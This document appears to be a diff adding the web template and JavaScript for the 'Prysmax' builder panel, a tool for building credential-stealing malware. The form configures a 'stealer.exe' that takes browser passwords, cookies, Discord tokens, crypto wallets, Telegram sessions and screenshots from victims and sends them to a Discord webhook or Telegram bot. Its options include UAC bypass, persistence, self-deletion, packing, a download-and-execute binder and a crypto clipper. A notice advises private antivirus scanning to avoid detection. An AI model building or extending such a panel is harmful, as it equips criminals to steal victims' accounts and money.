@@ -1,0 +1,442 @@
+{% extends "base.html" %}
+
+{% block title %}Builder - Prysmax{% endblock %}
+
+{% block content %}
+<div class="builder-page">
+    <!-- Builder Header -->
+    <div class="builder-header">
+        <div class="builder-title">
+            <h1>Advanced Builder</h1>
+            <span class="beta-badge">BETA</span>
+        </div>
+        <p class="builder-subtitle">Configure and build your client with advanced features</p>
+    </div>
+    
+    <!-- Builder Form -->
+    <form id="builderForm" class="builder-form">
+        <!-- Basic Configuration -->
+        <div class="config-section">
+            <div class="section-header">
+                <h3><i class="fas fa-code"></i> Basic Configuration</h3>
+                <p>Configure the basic settings for your build</p>
+            </div>
+            
+            <div class="form-grid">
+                <div class="form-group">
+                    <label for="filename">File Name</label>
+                    <div class="input-group">
+                        <input type="text" id="filename" name="filename" placeholder="Enter file name" value="stealer">
+                        <span class="input-suffix">.exe</span>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="webhook">Discord Webhook URL</label>
+                    <input type="url" id="webhook" name="webhook" placeholder="https://discord.com/api/webhooks/...">
+                </div>
+                
+                <div class="form-group">
+                    <label for="telegram_token">Telegram Bot Token</label>
+                    <input type="text" id="telegram_token" name="telegram_token" placeholder="Bot token (optional)">
+                </div>
+                
+                <div class="form-group">
+                    <label for="telegram_chat">Telegram Chat ID</label>
+                    <input type="text" id="telegram_chat" name="telegram_chat" placeholder="Chat ID (optional)">
+                </div>
+            </div>
+        </div>
+        
+        <!-- Protection Features -->
+        <div class="config-section">
+            <div class="section-header">
+                <h3><i class="fas fa-shield-alt"></i> Protection Features</h3>
+                <p>Enhanced security and protection options</p>
+            </div>
+            
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-user-shield"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h4>UAC Bypass</h4>
+                        <p>Elevated Privileges</p>
+                    </div>
+                    <div class="feature-toggle">
+                        <input type="checkbox" id="uac_bypass" name="uac_bypass" class="toggle-input">
+                        <label for="uac_bypass" class="toggle-label"></label>
+                    </div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-rocket"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h4>Startup</h4>
+                        <p>Persistence Module</p>
+                    </div>
+                    <div class="feature-toggle">
+                        <input type="checkbox" id="startup" name="startup" class="toggle-input">
+                        <label for="startup" class="toggle-label"></label>
+                    </div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-fire"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h4>Melt</h4>
+                        <p>Self Destruct Module</p>
+                    </div>
+                    <div class="feature-toggle">
+                        <input type="checkbox" id="melt" name="melt" class="toggle-input">
+                        <label for="melt" class="toggle-label"></label>
+                    </div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-compress-arrows-alt"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h4>UPX Packing</h4>
+                        <p>File Compression</p>
+                    </div>
+                    <div class="feature-toggle">
+                        <input type="checkbox" id="upx_packing" name="upx_packing" class="toggle-input">
+                        <label for="upx_packing" class="toggle-label"></label>
+                    </div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-paperclip"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h4>File Binder</h4>
+                        <p>Download and Execute Module</p>
+                    </div>
+                    <div class="feature-toggle">
+                        <input type="checkbox" id="file_binder" name="file_binder" class="toggle-input">
+                        <label for="file_binder" class="toggle-label"></label>
+                    </div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-expand-arrows-alt"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h4>Pumper</h4>
+                        <p>File Size Addition</p>
+                    </div>
+                    <div class="feature-toggle">
+                        <input type="checkbox" id="pumper" name="pumper" class="toggle-input">
+                        <label for="pumper" class="toggle-label"></label>
+                    </div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-coins"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h4>Crypto Clipper</h4>
+                        <p>Crypto Address Replacer</p>
+                    </div>
+                    <div class="feature-toggle">
+                        <input type="checkbox" id="crypto_clipper" name="crypto_clipper" class="toggle-input">
+                        <label for="crypto_clipper" class="toggle-label"></label>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Stealer Features -->
+        <div class="config-section">
+            <div class="section-header">
+                <h3><i class="fas fa-download"></i> Stealer Features</h3>
+                <p>Select what data to steal from victims</p>
+            </div>
+            
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-key"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h4>Passwords</h4>
+                        <p>Browser saved passwords</p>
+                    </div>
+                    <div class="feature-toggle">
+                        <input type="checkbox" id="passwords" name="passwords" class="toggle-input" checked>
+                        <label for="passwords" class="toggle-label"></label>
+                    </div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-cookie-bite"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h4>Cookies</h4>
+                        <p>Browser cookies and sessions</p>
+                    </div>
+                    <div class="feature-toggle">
+                        <input type="checkbox" id="cookies" name="cookies" class="toggle-input" checked>
+                        <label for="cookies" class="toggle-label"></label>
+                    </div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fab fa-discord"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h4>Discord Tokens</h4>
+                        <p>Discord authentication tokens</p>
+                    </div>
+                    <div class="feature-toggle">
+                        <input type="checkbox" id="discord_tokens" name="discord_tokens" class="toggle-input" checked>
+                        <label for="discord_tokens" class="toggle-label"></label>
+                    </div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-wallet"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h4>Crypto Wallets</h4>
+                        <p>Cryptocurrency wallet files</p>
+                    </div>
+                    <div class="feature-toggle">
+                        <input type="checkbox" id="wallets" name="wallets" class="toggle-input" checked>
+                        <label for="wallets" class="toggle-label"></label>
+                    </div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fab fa-telegram"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h4>Telegram Sessions</h4>
+                        <p>Telegram session files</p>
+                    </div>
+                    <div class="feature-toggle">
+                        <input type="checkbox" id="telegram" name="telegram" class="toggle-input" checked>
+                        <label for="telegram" class="toggle-label"></label>
+                    </div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-camera"></i>
+                    </div>
+                    <div class="feature-content">
+                        <h4>Screenshot</h4>
+                        <p>Desktop screenshot capture</p>
+                    </div>
+                    <div class="feature-toggle">
+                        <input type="checkbox" id="screenshot" name="screenshot" class="toggle-input" checked>
+                        <label for="screenshot" class="toggle-label"></label>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Important Notice -->
+        <div class="notice-card">
+            <div class="notice-icon">
+                <i class="fas fa-exclamation-triangle"></i>
+            </div>
+            <div class="notice-content">
+                <h4>Important Notice:</h4>
+                <p>Do not upload builds to VirusTotal as it publicly distributes samples. Use KleenScan/AVCheck for private scanning.</p>
+            </div>
+        </div>
+        
+        <!-- Build Actions -->
+        <div class="build-actions">
+            <button type="button" class="btn btn-secondary" id="resetBtn">
+                <i class="fas fa-undo"></i>
+                Reset Configuration
+            </button>
+            <button type="submit" class="btn btn-primary" id="buildBtn">
+                <i class="fas fa-hammer"></i>
+                Build Stealer
+            </button>
+        </div>
+    </form>
+    
+    <!-- Build Status Modal -->
+    <div id="buildModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Building Stealer...</h3>
+                <button class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="build-progress">
+                    <div class="progress-bar">
+                        <div class="progress-fill"></div>
+                    </div>
+                    <div class="build-status">Initializing build process...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('builderForm');
+    const buildBtn = document.getElementById('buildBtn');
+    const resetBtn = document.getElementById('resetBtn');
+    const modal = document.getElementById('buildModal');
+    const modalClose = document.querySelector('.modal-close');
+    
+    // Form submission
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Collect form data
+        const formData = new FormData(form);
+        const config = {
+            filename: formData.get('filename') || 'stealer',
+            webhook_url: formData.get('webhook'),
+            telegram_config: {
+                bot_token: formData.get('telegram_token'),
+                chat_id: formData.get('telegram_chat')
+            },
+            features: {
+                passwords: formData.has('passwords'),
+                cookies: formData.has('cookies'),
+                discord_tokens: formData.has('discord_tokens'),
+                wallets: formData.has('wallets'),
+                telegram: formData.has('telegram'),
+                screenshot: formData.has('screenshot')
+            },
+            protection: {
+                uac_bypass: formData.has('uac_bypass'),
+                startup: formData.has('startup'),
+                melt: formData.has('melt'),
+                upx_packing: formData.has('upx_packing'),
+                file_binder: formData.has('file_binder'),
+                pumper: formData.has('pumper'),
+                crypto_clipper: formData.has('crypto_clipper')
+            }
+        };
+        
+        // Validate required fields
+        if (!config.webhook_url) {
+            alert('Discord Webhook URL is required!');
+            return;
+        }
+        
+        // Show build modal
+        showBuildModal();
+        
+        // Send build request
+        fetch('/api/build', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(config)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                updateBuildStatus('Build completed successfully!', true);
+            } else {
+                updateBuildStatus('Build failed: ' + data.message, false);
+            }
+        })
+        .catch(error => {
+            updateBuildStatus('Build failed: ' + error.message, false);
+        });
+    });
+    
+    // Reset form
+    resetBtn.addEventListener('click', function() {
+        if (confirm('Are you sure you want to reset all configuration?')) {
+            form.reset();
+            // Re-check default features
+            document.getElementById('passwords').checked = true;
+            document.getElementById('cookies').checked = true;
+            document.getElementById('discord_tokens').checked = true;
+            document.getElementById('wallets').checked = true;
+            document.getElementById('telegram').checked = true;
+            document.getElementById('screenshot').checked = true;
+        }
+    });
+    
+    // Modal controls
+    modalClose.addEventListener('click', function() {
+        modal.style.display = 'none';
+    });
+    
+    window.addEventListener('click', function(e) {
+        if (e.target === modal) {
+            modal.style.display = 'none';
+        }
+    });
+    
+    function showBuildModal() {
+        modal.style.display = 'flex';
+        const progressFill = document.querySelector('.progress-fill');
+        const statusText = document.querySelector('.build-status');
+        
+        // Simulate build progress
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += Math.random() * 15;
+            if (progress > 90) progress = 90;
+            
+            progressFill.style.width = progress + '%';
+            
+            if (progress < 30) {
+                statusText.textContent = 'Preparing build environment...';
+            } else if (progress < 60) {
+                statusText.textContent = 'Compiling stealer modules...';
+            } else if (progress < 90) {
+                statusText.textContent = 'Applying protection features...';
+            }
+        }, 500);
+        
+        // Store interval for cleanup
+        modal.dataset.interval = interval;
+    }
+    
+    function updateBuildStatus(message, success) {
+        const progressFill = document.querySelector('.progress-fill');
+        const statusText = document.querySelector('.build-status');
+        
+        // Clear interval
+        if (modal.dataset.interval) {
+            clearInterval(modal.dataset.interval);
+        }
+        
+        progressFill.style.width = '100%';
+        progressFill.style.backgroundColor = success ? '#10b981' : '#ef4444';
+        statusText.textContent = message;
+        
+        // Auto-close after 3 seconds if successful
+        if (success) {
+            setTimeout(() => {
+                modal.style.display = 'none';
+            }, 3000);
+        }
+    }
+});
+</script>
+{% endblock %}
+
